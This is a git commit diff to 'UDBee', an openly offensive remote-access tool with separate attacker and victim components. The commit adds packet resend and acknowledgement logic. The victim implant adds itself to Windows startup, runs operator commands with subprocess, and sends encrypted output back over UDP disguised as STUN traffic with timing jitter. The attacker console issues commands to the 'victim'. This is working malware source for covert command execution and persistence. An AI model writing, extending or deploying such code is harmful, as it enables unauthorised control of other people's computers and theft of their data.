26e8dc4376af3d6c81d28e0c7665eef156ac1777
Mohammad Mhaidat <mojamusa05@gmail.com>
2025-08-12 04:43:57 +0300

    added support for packet resend to improve reliability

--- attacker/core.py
+++ attacker/core.py
@@ -8,7 +8,7 @@ from prompt_toolkit.formatted_text import HTML
 from prompt_toolkit.patch_stdout import patch_stdout
 from prompt_toolkit.shortcuts import print_formatted_text
 from dummy_packets import send_dummy_stun
-
+from check_missing import check_missing_packets
 
 # Logging helpers for consistent output
 def log_info(msg): print_formatted_text(HTML(f"<ansiyellow>[ INFO ]</ansiyellow> {msg}"))
@@ -43,6 +43,12 @@ my_pub_key = None
 my_priv_key = None
 transmitted_messages = 0
 exchanged_keys = False # Default False, changed when initianting a keys exchange, used to know when to encrypt and when to not
+received_chunks = {}
+expected_chunks = None
+total_data_received = 0
+last_received_time = None
+resends_requests = 0
+sent_chunks = {}
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
 # Parses a string representation of an RSA public key
@@ -73,7 +79,10 @@ def exchange_keys():
         log_error(f"<ansired>Target is unreachable.\n{e}</ansired>")
         return
 
-def send_msg(message):
+
+
+def send_msg(message, is_cached: bool):
+    sent_chunks = {}
     global transmitted_messages
     try:
         message = str(message)
@@ -83,8 +92,12 @@ def send_msg(message):
         chunks = fragment_message(message, chunk_size)
         # if random.choice([False, True]):
         #     send_dummy_stun(target_ip, target_port, target_pub_key, chunk_size, delay, jitter)
+        i = 0
         for chunk in chunks:
             chunk = build_stun_message(chunk)
+            if is_cached:
+                sent_chunks[i] = chunk
+                i+=1
             sock.sendto(chunk, (target_ip, target_port))
             transmitted_messages+=1
             jitter_delay = delay + random.uniform(-jitter, jitter)
@@ -93,11 +106,43 @@ def send_msg(message):
     except Exception as e:
         log_error(str(e))
 
+
+def timeout_checker():
+    global received_chunks, expected_chunks, last_received_time, resends_requests
+    while True:
+        if last_received_time is not None:
+            if resends_requests < 3:
+                try:
+                    if expected_chunks and (len(received_chunks) > 0) and ((time.time() - last_received_time) > 3):
+                        missing_packets = check_missing_packets(received_chunks, expected_chunks)
+                        if missing_packets:
+                            log_info(f"<ansiyellow>Received an incomplete response from the vicim, asking victim for {len(missing_packets)} missing packets</ansiyellow>")
+                            msg = "missing "
+                            counter = 0
+                            for i in missing_packets:
+                                msg+=str(i)
+                                if counter != (len(missing_packets) - 1):
+                                    msg+=","
+                                counter += 1
+                            sock.sendto(build_stun_message(msg), (target_ip, target_port))
+                            resends_requests+=1
+                            time.sleep(5)
+                            continue
+                except Exception as e:
+                    log_error(str(e))
+            else:
+                log_error("<ansired>Received an incomplete response from the vicim, tried 3 times to request the missing packets but didn't receive them, IGNORING THE RESPONSE!</ansired>")
+                resends_requests = 0
+                last_received_time = None
+                received_chunks = {}
+                expected_chunks = None
+        time.sleep(0.5)
+    time.sleep(0.5)
+
+
 def listener():
-    global transmitted_messages, my_pub_key, my_priv_key, target_port, target_pub_key, exchanged_keys
-    received_chunks = {}
-    expected_chunks = None
-    total_data_received = 0
+    global transmitted_messages, my_pub_key, my_priv_key, target_port, target_pub_key, exchanged_keys, sent_chunks, received_chunks, expected_chunks, total_data_received, last_received_time,  resends_requests
+    
     while True:
         try:
             sock.bind(SERVER)
@@ -149,6 +194,25 @@ def listener():
                 if exchanged_keys == False:
                     exchange_keys()
                 continue
+
+            if msg == "ACK":
+                sent_chunks = {}
+                last_received_time = None
+                continue
+
+            if msg.startswith("missing"):
+                try:
+                    missings = msg.split()[1].split(',')
+                    for missing in missings:
+                        sock.sendto(sent_chunks[int(missing)], (target_ip, target_port))
+                    received_chunks = {}
+                    expected_chunks = None
+                    continue
+                except Exception as e:
+                    log_error(str(e))
+                    continue
+
+            last_received_time = time.time()
             part, total, index = msg.split("|", 2)
             index = int(index)
             total = int(total)
@@ -171,8 +235,11 @@ def listener():
                     total_data_received = 0
                     received_chunks = {}
                     expected_chunks = None
+                    sent_chunks = {}
+                    last_received_time = None
                     continue
 
+                sock.sendto("ACK".encode('utf8'), (target_ip, target_port))
                 full_msg = base64.b64decode(full_msg)
                 full_msg = decrypt_message(full_msg, my_priv_key)
                 if full_msg["status"] == 200:
@@ -183,12 +250,12 @@ def listener():
                     received_chunks = {}
                     expected_chunks = None
                     continue
-
                 log_success(f"<ansigreen>received a response from the victim:</ansigreen>")
                 print_formatted_text(HTML(f"<ansigreen>{full_msg}</ansigreen>"))
                 total_data_received = 0
                 received_chunks = {}
                 expected_chunks = None
+                resends_requests = 0
                 continue
 
             else:
@@ -219,8 +286,15 @@ def main():
         print_formatted_text(HTML(logo))
         print_formatted_text(HTML("\t🐝 <ansimagenta>UDBee</ansimagenta> <ansicyan>–</ansicyan> <ansigreen>Because TCP Is Too Mainstream</ansigreen>"))
         print_formatted_text(HTML("\t<ansimagenta>GitHub:</ansimagenta> <ansicyan>@MoMhaidat05</ansicyan>"))
+        
+        threads = []
         thread = threading.Thread(target=listener)
-        thread.start()
+        thread2 = threading.Thread(target=timeout_checker)
+        threads.append(thread)
+        threads.append(thread2)
+        for t in threads:
+            t.start()
+
         log_error("<ansired>Keys wasn't exchanged, wait until the keys exchange is initiated.</ansired>")
         while not exchanged_keys:
             time.sleep(0.5)
@@ -262,7 +336,7 @@ def main():
                         log_error("<ansired>Chunk size must be greater than 20 bytes.</ansired>")
                         continue
                     command_to_send = ''.join(i+' ' for i in full_command)
-                    send_msg(command_to_send)
+                    send_msg(command_to_send, False)
                     continue
                 except:
                     log_error("<ansired>Chunk size should be an integer.</ansired>")
@@ -274,7 +348,7 @@ def main():
                 if command == "":
                     log_error("<ansired>Command cannot be empty, please provide a valid command.</ansired>")
                     continue
-                send_msg(command)
+                send_msg(command, True)
                 
 try:
     main()
--- victim/core.py
+++ victim/core.py
@@ -2,17 +2,21 @@ from encryption import encrypt_message
 from decryption import decrypt_message
 from message_fragmentation import fragment_message
 from stun import build_stun_message
-import socket, time, random, base64, struct, subprocess, gc, rsa
+import socket, time, random, base64, struct, subprocess, gc, rsa, threading
 from add_to_startup import add_to_windows_startup
-
+from check_missing import check_missing_packets
 my_priv_key = None
 my_pub_key = None
 target_pub_key = None
 CHUNK_SIZE = 256
 IS_ADDED_TO_STARTUP = False
 SERVER = ("127.0.0.1", 27381)
-
+sent_chunks = {}
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+last_received_time = None 
+resends_requests = 0
+received_chunks = {}
+expected_chunks = None
 
 def parse_public_key(text: str):
     try:
@@ -28,7 +32,7 @@ if IS_ADDED_TO_STARTUP == False:
     if add_to_windows_startup() == 200:
         IS_ADDED_TO_STARTUP = True
 
-def send_msg(message):
+def send_msg(message, is_cached: bool):
     if type(message) is not str:
         message = str(message)
     try:
@@ -36,27 +40,62 @@ def send_msg(message):
             message = encrypt_message(message, target_pub_key)["message"]
             message = base64.b64encode(message.encode()).decode()
         chunks = fragment_message(message, CHUNK_SIZE)
+        i = 0
         for chunk in chunks:
             chunk = build_stun_message(chunk)
+            if is_cached:
+                sent_chunks[i] = chunk
+                i+=1
             jitter_delay = 0.3 + random.uniform(-0.3, 0.3)
             time.sleep(jitter_delay)
             sock.sendto(chunk, SERVER)
+                
+        
     except:
         return
 
+
+def timeout_checker():
+    global received_chunks, expected_chunks, last_received_time, resends_requests
+    
+    while True:
+        if last_received_time is not None:
+            if resends_requests <= 3:
+                try:
+                    if expected_chunks and received_chunks and ((time.time() - last_received_time) > 3):
+                        missing_packets = check_missing_packets(received_chunks, expected_chunks)
+                        if missing_packets:
+                            counter = 0
+                            for i in missing_packets:
+                                msg+=str(i)
+                                if counter != (len(missing_packets) - 1):
+                                    msg+=","
+                                counter += 1
+                            sock.sendto(build_stun_message(msg), SERVER)
+                            time.sleep(3)
+                            continue
+                except:
+                    pass
+            else:
+                resends_requests = 0
+                last_received_time = None
+                received_chunks = {}
+                expected_chunks = None
+        time.sleep(0.5)
+    time.sleep(0.5)
+
 def core():
-    global my_priv_key, my_pub_key, target_pub_key, CHUNK_SIZE
+    global my_priv_key, my_pub_key, target_pub_key, CHUNK_SIZE, received_chunks, expected_chunks, sent_chunks
     
     while True:
         sock.sendto(build_stun_message("heartbeat".encode("utf8")), SERVER)
         sock.settimeout(20)
-        received_chunks = {}
-        expected_chunks = None
+        
 
         while True:
             try:
                 data, addr = sock.recvfrom(4096)
-
+                
                 if len(data) < 20:
                     continue
 
@@ -78,6 +117,27 @@ def core():
                 attr_type, attr_length = struct.unpack('!HH', attributes[:4])
                 command = attributes[4:4+attr_length]
                 command = command.decode("utf8")
+                if command == "ACK":
+                    sent_chunks = {}
+                    last_received_time = None
+                    gc.collect()
+                    continue
+                if command.startswith("missing"):
+                    try:
+                        missings = command.split()[1].split(',')
+                        try:
+                            for missing in missings:
+                                missing = int(missing)
+                                chunk = sent_chunks[missing]
+                                sock.sendto(chunk, SERVER)
+                        except:
+                            pass
+                        received_chunks = {}
+                        expected_chunks = None
+                        gc.collect()
+                    except:
+                        pass
+                    continue
 
                 part, total, index = command.split("|", 2)
                 index = int(index)
@@ -94,7 +154,7 @@ def core():
                     # Not encrypted message, such as public keys
                     if full_command.startswith("PublicKey("):
                         ( my_pub_key, my_priv_key ) = rsa.newkeys(512)
-                        send_msg(my_pub_key)
+                        send_msg(my_pub_key, False)
                         target_pub_key = parse_public_key(full_command)
                         received_chunks = {}
                         expected_chunks = None
@@ -105,7 +165,8 @@ def core():
                         full_command = base64.b64decode(full_command)
                         full_command = decrypt_message(full_command, my_priv_key)
                         if full_command["status"] != 200:
-                            send_msg("Failed to decrypt the message, there maybe a packet loss or a problem with the keys.")
+                            sock.sendto("ACK".encode('utf8'), SERVER)
+                            send_msg("Failed to decrypt the message, there maybe a packet loss or a problem with the keys.", False)
                             received_chunks = {}
                             expected_chunks = None
                             gc.collect()
@@ -117,30 +178,39 @@ def core():
                             cmd, chunk_size = full_command.split()
                             chunk_size = int(chunk_size)
                             CHUNK_SIZE = chunk_size
-                            send_msg(f"set chunk size => {CHUNK_SIZE}")
+                            send_msg(f"set chunk size => {CHUNK_SIZE}", False)
                             received_chunks = {}
                             expected_chunks = None
                             gc.collect()
                             continue
+                            
+                        
 
+                        sock.sendto("ACK".encode('utf8'), SERVER)
                         response = subprocess.getoutput(full_command)
-                        send_msg(response)
+                        send_msg(response, True)
                         received_chunks = {}
                         expected_chunks = None
                         gc.collect()
                         continue
                     
                     else:
-                        send_msg("Keys wasn't exchange or your key was lost, please initiate keys exchange to be able to run commands.")
+                        sock.sendto("ACK".encode('utf8'), SERVER)
+                        send_msg("Keys wasn't exchange or your key was lost, please initiate keys exchange to be able to run commands.", False)
                         received_chunks = {}
                         expected_chunks = None
                         gc.collect()
                         continue
                 else:
                     pass
-
             except socket.timeout:
                 break
             except:
                 pass
-core()
+threads = []
+thread = threading.Thread(target=core)
+thread2 = threading.Thread(target=timeout_checker)
+threads.append(thread)
+threads.append(thread2)
+for t in threads:
+    t.start()
